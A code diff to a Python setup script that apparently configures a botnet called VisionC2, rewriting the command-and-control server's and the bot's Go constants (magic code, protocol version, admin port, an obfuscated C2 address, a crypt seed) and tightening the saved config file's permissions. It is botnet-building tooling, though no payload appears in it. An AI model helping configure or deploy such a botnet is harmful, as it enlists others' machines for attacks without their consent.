@@ -327,19 +327,23 @@ def update_cnc_main_go(
 
     # Update MAGIC_CODE
     content = re.sub(
-        r'MAGIC_CODE\s*=\s*"[^"]*"', f'MAGIC_CODE       = "{magic_code}"', content
+        r'MAGIC_CODE\s*=\s*"[^"]*"',
+        lambda m: f'MAGIC_CODE       = "{magic_code}"',
+        content,
     )
 
     # Update PROTOCOL_VERSION
     content = re.sub(
         r'PROTOCOL_VERSION\s*=\s*"[^"]*"',
-        f'PROTOCOL_VERSION = "{protocol_version}"',
+        lambda m: f'PROTOCOL_VERSION = "{protocol_version}"',
         content,
     )
 
     # Update USER_SERVER_PORT
     content = re.sub(
-        r'USER_SERVER_PORT\s*=\s*"[^"]*"', f'USER_SERVER_PORT = "{admin_port}"', content
+        r'USER_SERVER_PORT\s*=\s*"[^"]*"',
+        lambda m: f'USER_SERVER_PORT = "{admin_port}"',
+        content,
     )
 
     with open(main_go_path, "w") as f:
@@ -396,23 +400,29 @@ def update_bot_main_go(
 
     # Update gothTits (obfuscated C2)
     content = re.sub(
-        r'const gothTits\s*=\s*"[^"]*"', f'const gothTits = "{obfuscated_c2}"', content
+        r'const gothTits\s*=\s*"[^"]*"',
+        lambda m: f'const gothTits = "{obfuscated_c2}"',
+        content,
     )
 
     # Update cryptSeed
     content = re.sub(
-        r'const cryptSeed\s*=\s*"[^"]*"', f'const cryptSeed = "{crypt_seed}"', content
+        r'const cryptSeed\s*=\s*"[^"]*"',
+        lambda m: f'const cryptSeed = "{crypt_seed}"',
+        content,
     )
 
     # Update magicCode
     content = re.sub(
-        r'const magicCode\s*=\s*"[^"]*"', f'const magicCode = "{magic_code}"', content
+        r'const magicCode\s*=\s*"[^"]*"',
+        lambda m: f'const magicCode = "{magic_code}"',
+        content,
     )
 
     # Update protocolVersion
     content = re.sub(
         r'const protocolVersion\s*=\s*"[^"]*"',
-        f'const protocolVersion = "{protocol_version}"',
+        lambda m: f'const protocolVersion = "{protocol_version}"',
         content,
     )
 
@@ -546,7 +556,7 @@ def save_config(base_path: str, config: dict):
     """Save configuration to a file for reference"""
     config_path = os.path.join(base_path, "setup_config.txt")
 
-    with open(config_path, "w") as f:
+    with open(os.open(config_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600), "w") as f:
         f.write("=" * 60 + "\n")
         f.write("VisionC2 Configuration\n")
         f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
